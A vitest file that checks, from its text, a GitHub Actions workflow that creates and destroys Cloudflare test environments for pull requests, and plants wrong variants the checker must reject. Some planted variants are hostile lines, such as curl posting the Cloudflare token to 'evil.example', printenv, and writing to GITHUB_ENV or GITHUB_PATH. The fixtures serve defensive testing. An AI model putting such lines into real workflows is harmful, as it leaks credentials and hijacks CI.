// Check 01 (M7.05, `design/milestones.md`; credentials 3 and 4 of `design/decisions/M7-release.md`): the workflow that gives a pull request a test world and a signed verdict is what its promises say.
// `.github/workflows/test-worlds.yml` (Goal 15's lead adds it to the brief's `owns`) cannot run here, because it makes a world on Cloudflare, so it is judged from its text by `workflow.ts`, and the one step that
// needs no cloud is run: `credentials`. Written by the checks author; a builder never edits this file, `workflow.ts` or anything under `e2e/m7/` (tools/ci/builder-paths.sh).
// WHAT IT PINS. The pull request shows `ortho / prove (test)` (workflow `ortho`, job `prove (test)`, `design/naming.md`). One job, only for ready pull requests from this repository (never a fork, which gets no secrets and no id
// token; never `pull_request_target`). The run id carries the pull request's number and the run. It refuses to start, before it makes anything, without `CLOUDFLARE_API_TOKEN` and `CLOUDFLARE_ACCOUNT_ID`, and past the day's
// cap of 20 (step `cap`, judged by check 04). It plans (`ortho env up test --plan`, the one place the prefix is formed, check 02), lists the account, stands the world, proves with `--env test`, and then, whatever happened,
// destroys the run's world and lists the account again; the last step fails the job on any resource with the run's prefix left and on anything without it that changed (the same judge staging uses, `e2e/staging/leftovers.mjs`).
// The job alone holds `id-token: write`; prove asks the runner for it, so no step names a token, the local issuer or `ORTHO_LOGBOOK_TOKEN`. The Cloudflare credentials are in the `env` of the steps that talk to the account and nowhere else.
// A job killed mid-run: its steps that clean up run `always()` (a cancel included), the job's timeout (at most 60 minutes) is shorter than a world's lifetime (the test environment's, 2 hours, read from the model), and a runner
// killed outright is the local half's: `packages/prove/src/modules/test-worlds/test-worlds.test.ts` kills a run with SIGKILL and finds the world gone after its lifetime. A per-run stack that outlives a dead runner is an open decision (the pull request).
// Red today on one reason: the file does not exist. Controls, true today: the judge fails each planted wrong workflow below (a plant is one edit of the parsed file, so none depends on the file's layout); the staging workflow is not mistaken for this one.
import { spawnSync } from "node:child_process";
import { existsSync, readFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { parse, stringify } from "yaml";
import { repo } from "./support.ts";
import { PATH, problems, RUN } from "./workflow.ts";

const file = join(repo, PATH);
const real = existsSync(file) ? readFileSync(file, "utf8") : "";
const present = (what: string) => expect(existsSync(file), `${PATH} does not exist (${what})`).toBe(true);
type Step = Record<string, any>;
type Doc = Record<string, any> & { jobs: { prove: Record<string, any> & { steps: Step[] } } };
const TOKEN = "${{ secrets.CLOUDFLARE_API_TOKEN }}";
const ALWAYS = "always() && steps.credentials.outcome == 'success' && steps.cap.outcome == 'success'";

/** The real workflow, parsed, changed in one place and written out again: a plant is one edit, whatever the file's layout. A step that is not there stops the plant, so one that matches nothing is not a pass. */
const plant = (edit: (doc: Doc, step: (id: string) => Step) => void): string => {
  present("a plant needs it");
  const doc = parse(real) as Doc;
  edit(doc, (id) => {
    const found = doc.jobs.prove.steps.find((s) => s.id === id);
    if (found === undefined) throw new Error(`the workflow has no step ${id} to plant over`);
    return found;
  });
  return stringify(doc);
};
/** The real text with one thing replaced; throws when the thing is not there. */
const swap = (from: string | RegExp, to: string) => {
  present("a plant needs it");
  if (!(typeof from === "string" ? real.includes(from) : from.test(real))) throw new Error(`the workflow has no ${String(from)} to plant over`);
  return real.replace(from, to);
};
const job = (d: Doc) => d.jobs.prove;
const upload = (d: Doc): Step => {
  const found = job(d).steps.find((s) => /upload-artifact/.test(s["uses"] ?? ""));
  if (found === undefined) throw new Error("the workflow has no evidence upload to plant over");
  return found;
};

describe("01: the test-worlds workflow (M7.05), judged from its text", () => {
  it("is what the check says", () => {
    present("it is the workflow that gives a pull request a test world and a signed verdict");
    expect(problems(real)).toEqual([]);
  });

  it("starts on a pull request alone and shows the name the pull request shows", () => {
    present("no workflow, no check on the pull request");
    const doc = parse(real) as Doc;
    expect(doc["name"]).toBe("ortho");
    expect(Object.keys(doc.jobs)).toEqual(["prove"]);
    expect(job(doc)["name"]).toBe("prove (test)");
    expect(Object.keys(doc["on"])).toEqual(["pull_request"]);
  });

  it("makes a run id that carries the pull request and the run, within the plan's 20 letters and digits at the largest ids GitHub issues for a long while", () => {
    const longest = RUN.replace("${{ github.event.pull_request.number }}", "99999").replace("${{ github.run_id }}", "99999999999").replace("${{ github.run_attempt }}", "9");
    expect(longest).toMatch(/^[a-z0-9]{1,20}$/);
    for (const part of ["github.event.pull_request.number", "github.run_id", "github.run_attempt"]) expect(RUN).toContain(part);
    present("its env must hold exactly that run id");
    expect(job(parse(real) as Doc)["env"]["RUN"]).toBe(RUN);
  });

  it("ends before a world's life does: the job's timeout is at most 60 minutes, the test environment's lifetime is read from the model", () => {
    present("its job needs a timeout");
    const model = JSON.parse(readFileSync(join(repo, "examples/plugged-in/generated/model/model.json"), "utf8")) as { environments: Record<string, { lifetimeMs: number | null }> };
    const lifetime = model.environments["test"]!.lifetimeMs!;
    expect(lifetime).toBe(2 * 60 * 60 * 1000);
    expect(job(parse(real) as Doc)["timeout-minutes"] * 60_000).toBeLessThan(lifetime);
  });

  describe("the credentials step refuses, before anything is made, and says which are missing", () => {
    const SENTINEL = "sentinel-5c1e0d7a";
    // The step's own `run:`, as GitHub reads it, run by bash with only these variables. The sentinel stands where a credential would; it is not one.
    const run = (env: Record<string, string>) => {
      present("its first step is the credentials check");
      const body = String(job(parse(real) as Doc).steps.find((s) => s.id === "credentials")?.["run"] ?? "");
      expect(body, "the credentials step has a script").not.toBe("");
      const done = spawnSync("bash", ["-c", body], { encoding: "utf8", env: { PATH: process.env["PATH"] ?? "", ...env } });
      return { status: done.status, said: `${done.stdout}${done.stderr}` };
    };
    it("neither set: exit 1, both names said", () => {
      const r = run({});
      expect(r.status).toBe(1);
      expect(r.said).toMatch(/CLOUDFLARE_API_TOKEN/);
      expect(r.said).toMatch(/CLOUDFLARE_ACCOUNT_ID/);
    });
    it("only the token: exit 1, the account's id named and the token not", () => {
      const r = run({ CLOUDFLARE_API_TOKEN: SENTINEL });
      expect([r.status, /CLOUDFLARE_ACCOUNT_ID/.test(r.said), /CLOUDFLARE_API_TOKEN/.test(r.said), r.said.includes(SENTINEL)]).toEqual([1, true, false, false]);
    });
    it("only the account's id: exit 1, the token named and the id not", () => {
      const r = run({ CLOUDFLARE_ACCOUNT_ID: SENTINEL });
      expect([r.status, /CLOUDFLARE_API_TOKEN/.test(r.said), /CLOUDFLARE_ACCOUNT_ID/.test(r.said), r.said.includes(SENTINEL)]).toEqual([1, true, false, false]);
    });
    it("a value that is only blanks, or empty, counts as missing", () => {
      expect(run({ CLOUDFLARE_API_TOKEN: "   ", CLOUDFLARE_ACCOUNT_ID: SENTINEL }).status).toBe(1);
      expect(run({ CLOUDFLARE_API_TOKEN: SENTINEL, CLOUDFLARE_ACCOUNT_ID: "" }).status).toBe(1);
    });
    it("both set: exit 0, and neither value is printed", () => {
      const r = run({ CLOUDFLARE_API_TOKEN: SENTINEL, CLOUDFLARE_ACCOUNT_ID: `${SENTINEL}-account` });
      expect(r.status).toBe(0);
      expect(r.said).not.toContain(SENTINEL);
    });
  });

  describe("the judge fails each planted wrong workflow", () => {
    // Every thing the judge reads, planted wrong one way at a time (the table of the pull request: each row is one thing read against one way).
    const plants: ReadonlyArray<readonly [string, () => string, RegExp]> = [
      // ---- how it starts, and for whom ----
      ["a push trigger beside the pull request", () => plant((d) => { d["on"] = { push: { branches: ["main"] }, pull_request: d["on"].pull_request }; }), /starts on/],
      ["pull_request_target (secrets for a fork's code)", () => plant((d) => { d["on"] = { pull_request_target: d["on"].pull_request }; }), /starts on/],
      ["a hand-started dispatch beside it", () => plant((d) => { d["on"] = { workflow_dispatch: null, pull_request: d["on"].pull_request }; }), /starts on/],
      ["a schedule beside it", () => plant((d) => { d["on"] = { schedule: [{ cron: "0 3 * * *" }], pull_request: d["on"].pull_request }; }), /starts on/],
      ["a branch filter", () => plant((d) => { d["on"].pull_request["branches-ignore"] = ["main"]; }), /filters/],
      ["a path filter", () => plant((d) => { d["on"].pull_request["paths"] = ["packages/**"]; }), /filters/],
      ["a type left out", () => plant((d) => { d["on"].pull_request.types = ["opened", "reopened", "ready_for_review"]; }), /types/],
      ["a type added", () => plant((d) => { d["on"].pull_request.types.push("labeled"); }), /types/],
      ["the draft guard dropped", () => plant((d) => { job(d)["if"] = "github.event.pull_request.head.repo.full_name == github.repository"; }), /`if` is/],
      ["the fork guard dropped", () => plant((d) => { job(d)["if"] = "github.event.pull_request.draft != true"; }), /`if` is/],
      ["the fork guard reversed", () => plant((d) => { job(d)["if"] = "github.event.pull_request.draft != true && github.event.pull_request.head.repo.full_name != github.repository"; }), /`if` is/],
      ["no job guard at all", () => plant((d) => { delete job(d)["if"]; }), /`if` is undefined/],
      ["another workflow name", () => plant((d) => { d["name"] = "test-worlds"; }), /name is "test-worlds"/],
      ["another job name", () => plant((d) => { job(d)["name"] = "prove"; }), /job's name/],
      ["a second job", () => plant((d) => { d.jobs["extra"] = { "runs-on": "ubuntu-latest", steps: [{ run: "echo hi" }] }; }), /the jobs/],
      ["runs of one pull request that cancel each other midway", () => plant((d) => { d["concurrency"]["cancel-in-progress"] = true; }), /serialised/],
      ["one group for every pull request", () => plant((d) => { d["concurrency"].group = "test-worlds"; }), /serialised/],
      // ---- the id token and the credentials ----
      ["id-token: write for the whole workflow", () => plant((d) => { d["permissions"]["id-token"] = "write"; }), /workflow's permissions/],
      ["id-token left off the job", () => plant((d) => { delete job(d)["permissions"]["id-token"]; }), /job's permissions/],
      ["id-token: read on the job", () => plant((d) => { job(d)["permissions"]["id-token"] = "read"; }), /job's permissions/],
      ["contents: write on the job", () => plant((d) => { job(d)["permissions"]["contents"] = "write"; }), /job's permissions/],
      ["checks left off the job (the verdict has no check run of its own)", () => plant((d) => { delete job(d)["permissions"]["checks"]; }), /job's permissions/],
      ["checks: read on the job", () => plant((d) => { job(d)["permissions"]["checks"] = "read"; }), /job's permissions/],
      ["pull-requests: write on the job", () => plant((d) => { job(d)["permissions"]["pull-requests"] = "write"; }), /job's permissions/],
      ["the token in the job's env (every step holds it)", () => plant((d) => { job(d)["env"]["CLOUDFLARE_API_TOKEN"] = TOKEN; }), /job's env/],
      ["a token supplied by hand", () => plant((d, s) => { s("prove")["env"]["ORTHO_LOGBOOK_TOKEN"] = "${{ secrets.CLOUDFLARE_API_TOKEN }}"; }), /ORTHO_LOGBOOK_TOKEN/],
      ["the local issuer standing in for GitHub", () => plant((d, s) => { s("prove")["env"]["ORTHO_OIDC_ISSUER"] = "${{ vars.ORTHO_LOGBOOK_URL }}"; }), /ORTHO_OIDC/],
      ["the runner's token request typed by hand", () => plant((d, s) => { s("prove")["env"]["ACTIONS_ID_TOKEN_REQUEST_URL"] = "${{ vars.ORTHO_LOGBOOK_URL }}"; }), /ACTIONS_ID_TOKEN/],
      ["a typed prefix", () => plant((d, s) => { s("plan")["run"] += "\n# ortho-pluggedin-test-1"; }), /typed prefix/],
      ["another secret", () => plant((d, s) => { s("before")["env"]["CLOUDFLARE_API_TOKEN"] = "${{ secrets.NPM_TOKEN }}"; }), /expression/],
      ["the whole secrets object", () => plant((d, s) => { s("up")["env"]["CLOUDFLARE_API_TOKEN"] = "${{ toJSON(secrets) }}"; }), /expression/],
      ["the account's id from a secret", () => plant((d, s) => { s("up")["env"]["CLOUDFLARE_ACCOUNT_ID"] = "${{ secrets.CLOUDFLARE_ACCOUNT_ID }}"; }), /expression/],
      ["a credential in the plan step", () => plant((d, s) => { s("plan")["env"] = { CLOUDFLARE_API_TOKEN: TOKEN }; }), /plan: its env/],
      ["a credential in the judge step", () => plant((d, s) => { s("judge")["env"]["CLOUDFLARE_API_TOKEN"] = TOKEN; }), /judge: its env/],
      ["a credential in the evidence step", () => plant((d, s) => { s("evidence")["env"]["CLOUDFLARE_API_TOKEN"] = TOKEN; }), /evidence: its env/],
      ["the account's id left out of destroy", () => plant((d, s) => { delete s("destroy")["env"]["CLOUDFLARE_ACCOUNT_ID"]; }), /destroy: its env/],
      ["the production environment", () => plant((d) => { job(d)["environment"] = "production"; }), /names the environment/],
      ["the staging environment (admits only main and goal/*, so a pull request never enters it)", () => plant((d) => { job(d)["environment"] = "staging"; }), /names the environment/],
      ["an environment given as an object", () => plant((d) => { job(d)["environment"] = { name: "staging" }; }), /names the environment/],
      ["a fork's code checked out", () => plant((d) => { const c = job(d).steps.find((s) => /actions\/checkout/.test(s["uses"] ?? "")); if (c === undefined) throw new Error("no checkout"); c["with"] = { ref: "${{ github.event.pull_request.head.sha }}" }; }), /expression|checkout/],
      ["a timeout of a day", () => plant((d) => { job(d)["timeout-minutes"] = 1440; }), /timeout/],
      ["no timeout", () => plant((d) => { delete job(d)["timeout-minutes"]; }), /timeout/],
      // ---- refusing without credentials, and the cap ----
      ["no credentials step", () => plant((d, s) => { s("credentials")["id"] = "creds"; }), /no step with id credentials/],
      ["a credentials step that is skipped", () => plant((d, s) => { s("credentials")["if"] = "false"; }), /credentials: its `if`/],
      ["a credentials step that continues on error", () => plant((d, s) => { s("credentials")["continue-on-error"] = true; }), /credentials: continue-on-error/],
      ["a credentials step holding no credential", () => plant((d, s) => { delete s("credentials")["env"]; }), /credentials: its env/],
      ["a credentials step with no script", () => plant((d, s) => { delete s("credentials")["run"]; }), /no script/],
      ["no cap step", () => plant((d, s) => { s("cap")["id"] = "capped"; }), /no step with id cap/],
      ["a cap that is a dry run", () => plant((d, s) => { s("cap")["run"] = "echo node tools/release/world-cap.mjs"; }), /cap: its script/],
      ["a cap that continues on error", () => plant((d, s) => { s("cap")["continue-on-error"] = true; }), /cap: continue-on-error/],
      ["a cap that hides its failure", () => plant((d, s) => { s("cap")["run"] = "node tools/release/world-cap.mjs || true"; }), /cap: its script|hides a failure/],
      ["a cap with no token to count with", () => plant((d, s) => { delete s("cap")["env"]["GH_TOKEN"]; }), /cap: its env/],
      ["a cap that counts another workflow", () => plant((d, s) => { s("cap")["env"]["WORKFLOW_FILE"] = "ci.yml"; }), /cap: its env/],
      ["a cap of 21", () => plant((d) => { job(d)["env"]["WORLD_CAP"] = "21"; }), /job's env/],
      ["no cap in the job's env", () => plant((d) => { delete job(d)["env"]["WORLD_CAP"]; }), /job's env/],
      ["the cap checked after the world is up", () => plant((d) => { const steps = job(d).steps; const at = steps.findIndex((s) => s["id"] === "cap"); const [cap] = steps.splice(at, 1); steps.splice(steps.findIndex((s) => s["id"] === "up") + 1, 0, cap!); }), /order/],
      ["the credentials checked after the plan", () => plant((d) => { const steps = job(d).steps; const at = steps.findIndex((s) => s["id"] === "credentials"); const [c] = steps.splice(at, 1); steps.splice(steps.findIndex((s) => s["id"] === "plan") + 1, 0, c!); }), /order/],
      // ---- the world is made by the plan's prefix, and destroyed whatever happened ----
      ["a plan for staging", () => swap("env up test --plan", "env up staging --plan"), /plan: its script/],
      ["up for staging", () => plant((d, s) => { s("up")["run"] = '$ORTHO env up staging --run "$RUN" --root examples/plugged-in'; }), /up: its script/],
      ["up that hides its failure", () => plant((d, s) => { s("up")["run"] += " || true"; }), /up: its script|hides a failure/],
      ["up that does not continue on error (destroy still runs, but prove and the verdict are never read)", () => plant((d, s) => { delete s("up")["continue-on-error"]; }), /up: continue-on-error/],
      ["no destroy step", () => plant((d, s) => { s("destroy")["id"] = "destroyed"; }), /no step with id destroy/],
      ["destroy that does not always run", () => plant((d, s) => { delete s("destroy")["if"]; }), /destroy: its `if`/],
      ["destroy that runs only when prove passed", () => plant((d, s) => { s("destroy")["if"] = "success()"; }), /destroy: its `if`/],
      ["destroy that runs even before the credentials were checked", () => plant((d, s) => { s("destroy")["if"] = "always()"; }), /destroy: its `if`/],
      ["destroy that is always() && false", () => plant((d, s) => { s("destroy")["if"] = `${ALWAYS} && false`; }), /destroy: its `if`/],
      ["destroy that swallows its failure", () => plant((d, s) => { s("destroy")["continue-on-error"] = true; }), /destroy: continue-on-error/],
      ["destroy that is a dry run", () => plant((d, s) => { s("destroy")["run"] = '$ORTHO env destroy test --plan --run "$RUN" --root examples/plugged-in'; }), /destroy: its script/],
      ["destroy that only echoes", () => plant((d, s) => { s("destroy")["run"] = `echo ${s("destroy")["run"]}`; }), /destroy: its script/],
      ["destroy of staging", () => plant((d, s) => { s("destroy")["run"] = '$ORTHO env destroy staging --run "$RUN" --root examples/plugged-in'; }), /destroy: its script/],
      ["destroy by a typed name", () => plant((d, s) => { s("destroy")["run"] = "wrangler delete --name x"; }), /destroy: its script|reaches the account/],
      ["no listing before", () => plant((d, s) => { s("before")["id"] = "beforehand"; }), /no step with id before/],
      ["the listing after destroy that does not always run", () => plant((d, s) => { delete s("after")["if"]; }), /after: its `if`/],
      ["the listing after that keeps going when it cannot read", () => plant((d, s) => { s("after")["continue-on-error"] = true; }), /after: continue-on-error/],
      ["the judgement that does not always run", () => plant((d, s) => { delete s("judge")["if"]; }), /judge: its `if`/],
      ["the judgement that continues on error", () => plant((d, s) => { s("judge")["continue-on-error"] = true; }), /judge: continue-on-error/],
      ["a judgement whose exit is 0", () => plant((d, s) => { s("judge")["run"] = String(s("judge")["run"]).replace('exit "${PIPESTATUS[0]}"', "exit 0"); }), /judge: its script|hides a failure/],
      ["a judgement that does not take --before (a change without the prefix goes unseen)", () => plant((d, s) => { s("judge")["run"] = String(s("judge")["run"]).replace('--before "$EVIDENCE/private/before.json"', ""); }), /judge: its script/],
      ["a judgement with the prefix typed", () => plant((d, s) => { s("judge")["env"]["PREFIX"] = "ortho-pluggedin-test-1"; }), /judge: its env|typed prefix/],
      ["the whole account's listing uploaded", () => plant((d) => { upload(d)["with"]["path"] += "\ntmp/test-worlds/private/after.json"; }), /evidence upload/],
      ["a glob for the evidence", () => plant((d) => { upload(d)["with"]["path"] += "\ntmp/test-worlds/*"; }), /evidence upload/],
      ["evidence kept for 90 days", () => plant((d) => { upload(d)["with"]["retention-days"] = 90; }), /7 days/],
      ["an evidence upload that does not always run", () => plant((d) => { upload(d)["if"] = "success()"; }), /always\(\)/],
      ["an action at a floating version", () => plant((d) => { const c = job(d).steps.find((s) => /actions\/checkout/.test(s["uses"] ?? "")); if (c === undefined) throw new Error("no checkout"); c["uses"] = "actions/checkout@main"; }), /pinned version/],
      ["an action that is none of the four", () => plant((d) => { job(d).steps.unshift({ uses: "someone/else@v1.0.0" }); }), /four actions/],
      // ---- proving, and who signs ----
      ["prove that never runs", () => plant((d, s) => { s("prove")["if"] = "false"; }), /prove: its `if`/],
      ["prove for staging", () => plant((d, s) => { s("prove")["run"] = String(s("prove")["run"]).replace("--env test", "--env staging"); }), /prove: its script/],
      ["prove that ends the job before destroy is read", () => plant((d, s) => { delete s("prove")["continue-on-error"]; }), /prove: continue-on-error/],
      ["no logbook step (the run's own logbook is stood up for it)", () => plant((d, s) => { s("logbook")["id"] = "elsewhere"; }), /no step with id logbook/],
      ["a logbook step that stands a long-lived one", () => plant((d, s) => { s("logbook")["run"] = '$ORTHO env up logbook --root examples/plugged-in'; }), /logbook: its script/],
      ["a logbook step after prove", () => plant((d) => { const st = job(d).steps; const at = st.findIndex((x) => x["id"] === "logbook"); const [l] = st.splice(at, 1); st.splice(st.findIndex((x) => x["id"] === "prove") + 1, 0, l!); }), /order/],
      ["a logbook step that never runs", () => plant((d, s) => { s("logbook")["if"] = "false"; }), /logbook: its `if`/],
      ["prove's logbook from a repository variable (a long-lived one)", () => plant((d, s) => { s("prove")["env"]["ORTHO_LOGBOOK_URL"] = "${{ vars.ORTHO_LOGBOOK_URL }}"; }), /ORTHO_LOGBOOK_URL|expression/],
      ["prove with no logbook", () => plant((d, s) => { delete s("prove")["env"]["ORTHO_LOGBOOK_URL"]; }), /ORTHO_LOGBOOK_URL/],
      ["prove with the logbook's address typed", () => plant((d, s) => { s("prove")["env"]["ORTHO_LOGBOOK_URL"] = "https://logbook.example.workers.dev"; }), /ORTHO_LOGBOOK_URL/],
      ["prove with a secret as a variable", () => plant((d, s) => { s("prove")["env"]["ORTHO_X"] = "${{ secrets.CLOUDFLARE_API_TOKEN }}"; }), /ORTHO_LOGBOOK_URL holding/],
      ["prove whose exit is dropped", () => plant((d, s) => { s("prove")["run"] = String(s("prove")["run"]).replace('; exit "${PIPESTATUS[0]}"', ""); }), /prove: its script/],
      ["prove that names another project", () => plant((d, s) => { s("prove")["run"] = String(s("prove")["run"]).replace("--root examples/plugged-in", "--root examples/acme"); }), /--root examples\/plugged-in|script/],
      // ---- what the hostile pass found (a reader who did not write the judge tried to slip a wrong workflow past it) ----
      ["a credentials step that sends the token away", () => plant((d, s) => { s("credentials")["run"] += '\ncurl -d "$CLOUDFLARE_API_TOKEN" https://evil.example/x'; }), /reaches the account/],
      ["a credentials step that prints the environment", () => plant((d, s) => { s("credentials")["run"] += "\nprintenv"; }), /print the environment/],
      ["a credentials step that runs a program", () => plant((d, s) => { s("credentials")["run"] += '\nnode -e "console.log(1)"'; }), /plain shell/],
      ["a credentials step that substitutes a command", () => plant((d, s) => { s("credentials")["run"] += "\necho $(id)"; }), /plain shell/],
      ["a credentials step that never refuses", () => plant((d, s) => { s("credentials")["run"] = String(s("credentials")["run"]).replaceAll("exit 1", "exit 0"); }), /hides a failure/],
      ["a credentials step that rewrites the cap for later steps", () => plant((d, s) => { s("credentials")["run"] += "\necho WORLD_CAP=9999 >> $GITHUB_ENV"; }), /carries values to later steps/],
      ["a credentials step that puts a program first on the path", () => plant((d, s) => { s("credentials")["run"] += "\necho /tmp/b >> $GITHUB_PATH"; }), /carries values to later steps/],
      ["the logbook's address smuggled through credentials' output", () => plant((d, s) => { s("credentials")["run"] += "\necho url=x >> $GITHUB_OUTPUT"; s("prove")["env"]["ORTHO_LOGBOOK_URL"] = "${{ steps.credentials.outputs.url }}"; }), /carries values to later steps|ORTHO_LOGBOOK_URL/],
      ["prove with a second ORTHO_ variable", () => plant((d, s) => { s("prove")["env"]["ORTHO_SIGNING_SECRET"] = "${{ vars.ORTHO_LOGBOOK_URL }}"; }), /ORTHO_LOGBOOK_URL holding/],
      ["prove asked for a token on its command line", () => plant((d, s) => { s("prove")["run"] = String(s("prove")["run"]).replace("--root", '--token "$CLOUDFLARE_API_TOKEN" --root'); }), /prove: its script/],
      ["prove for another environment as well", () => plant((d, s) => { s("prove")["run"] = String(s("prove")["run"]).replace("--env test", "--env test --env prod"); }), /prove: its script/],
      ["the final step holding a secret", () => plant((d) => { const f = job(d).steps.find((x) => x["id"] === undefined && /::error::/.test(x["run"] ?? "")); if (f === undefined) throw new Error("no final step"); f["env"]["UP"] = TOKEN; }), /final step's env|expression/],
      ["the final step substituting a command", () => plant((d) => { const f = job(d).steps.find((x) => x["id"] === undefined && /::error::/.test(x["run"] ?? "")); if (f === undefined) throw new Error("no final step"); f["run"] = 'echo "::error::$(env)"\nexit 1'; }), /final step does not say why/],
      ["the evidence upload holding a secret in its env", () => plant((d) => { upload(d)["env"] = { GH_TOKEN: "${{ github.token }}" }; }), /carries a script, env/],
      ["the evidence upload with a hidden-files switch", () => plant((d) => { upload(d)["with"]["include-hidden-files"] = true; }), /sets more than name/],
      ["the evidence upload named by a secret", () => plant((d) => { upload(d)["with"]["name"] = TOKEN; }), /sets more than name|expression/],
      ["setup-node given a token", () => plant((d) => { const n = job(d).steps.find((x) => /setup-node/.test(x["uses"] ?? "")); if (n === undefined) throw new Error("no setup-node"); n["with"]["token"] = TOKEN; }), /setup-node is exactly/],
      ["setup-node pointed at another registry", () => plant((d) => { const n = job(d).steps.find((x) => /setup-node/.test(x["uses"] ?? "")); if (n === undefined) throw new Error("no setup-node"); n["with"]["registry-url"] = "https://evil.example/npm"; }), /setup-node is exactly/],
      ["pnpm's setup that installs by itself", () => plant((d) => { const n = job(d).steps.find((x) => /pnpm\/action-setup/.test(x["uses"] ?? "")); if (n === undefined) throw new Error("no action-setup"); n["with"] = { run_install: true }; }), /takes no inputs/],
      ["a checkout that leaves the token in .git/config", () => plant((d) => { const c = job(d).steps.find((x) => /actions\/checkout/.test(x["uses"] ?? "")); if (c === undefined) throw new Error("no checkout"); delete c["with"]; }), /checkout is exactly/],
      ["the install after the world is up", () => plant((d) => { const steps = job(d).steps; const at = steps.findIndex((x) => x["run"] === "pnpm install --frozen-lockfile"); const [i] = steps.splice(at, 1); steps.splice(steps.findIndex((x) => x["id"] === "up") + 1, 0, i!); }), /comes after the credentials step/],
      ["a step named by a secret", () => plant((d, s) => { s("before")["name"] = `before ${TOKEN}`; }), /holds an expression/],
      ["a branch filter on the pull request", () => plant((d) => { d["on"].pull_request.branches = ["main"]; }), /filters/],
      // ---- the last step ----
      ["no final failure step", () => plant((d) => { job(d).steps = job(d).steps.filter((s) => s["id"] !== undefined); }), /final step/],
      ["a final step that exits 0", () => plant((d) => { const f = job(d).steps.find((s) => s["id"] === undefined && /::error::/.test(s["run"] ?? "")); if (f === undefined) throw new Error("no final step"); f["run"] = String(f["run"]).replace("exit 1", "exit 0"); }), /final step/],
    ];
    it.each(plants)("%s", (_name, make, say) => {
      const found = problems(make());
      expect(found.length, `nothing was wrong with ${_name}`).toBeGreaterThan(0);
      expect(found.join("\n")).toMatch(say);
    });

    it("an empty file, a file that is not YAML and the staging workflow are each refused", () => {
      expect(problems("")).not.toEqual([]);
      expect(problems("a: [").join("\n")).toMatch(/not YAML/);
      expect(problems(readFileSync(join(repo, ".github/workflows/staging.yml"), "utf8")).join("\n")).toMatch(/name is "staging"/);
    });
  });
});
